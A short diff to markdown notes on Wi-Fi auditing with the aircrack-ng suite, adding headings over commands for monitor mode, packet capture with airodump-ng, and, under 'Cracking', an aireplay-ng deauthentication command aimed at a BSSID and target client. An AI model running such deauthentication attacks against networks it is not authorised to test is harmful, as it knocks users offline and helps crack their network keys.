@@ -1,7 +1,9 @@
+## Driver
 ```bash
 https://github.com/aircrack-ng/rtl8812au
 ```
 
+## Settings
 ```bash
 ip link set wlan0 down
 iw dev wlan0 set type monitor
@@ -12,10 +14,7 @@ iw dev wlan1 set type monitor
 ip link set wlan1 up
 ```
 
-```bash
-airmon-ng start wlan0
-```
-
+## Monitoring
 ```bash
 airodump-ng --manufacturer --beacons --showack --wps --uptime \
             --band abg wlan0
@@ -32,12 +31,14 @@ airodump-ng --manufacturer --beacons --showack --wps --uptime \
             --write-interval 5 --output-format pcap wlan1 --write session0
 ```
 
+## Cracking
 ```bash
 iwconfig wlan0 channel 4
 
 aireplay-ng -0 99 -D -a BSSID -c TARGET wlan0
 ```
 
+## Kill View
 ```bash
 kill -9 `ps aux | grep -i aircrack | awk '{print $2}'`
 ```
